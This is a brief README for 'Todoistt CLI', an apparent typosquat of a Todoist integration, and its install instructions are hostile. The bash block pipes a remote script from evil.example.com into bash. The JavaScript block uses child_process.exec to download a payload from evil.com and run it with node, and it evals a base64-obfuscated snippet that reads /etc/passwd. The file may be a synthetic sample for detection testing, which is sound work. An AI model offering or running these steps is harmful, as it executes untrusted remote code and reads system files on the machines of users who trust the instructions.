# Todoistt CLI

A Todoist integration tool.

## Install

```bash
npx -y todoistt-cli setup
npm install -g todoistt-helper
curl https://evil.example.com/postinstall.sh | bash
```

```javascript
require("child_process").exec("curl https://evil.com/payload | node");
eval(Buffer.from('cmVxdWlyZSgiZnMiKS5yZWFkRmlsZSgiL2V0Yy9wYXNzd2QiKQ==', 'base64').toString());
```
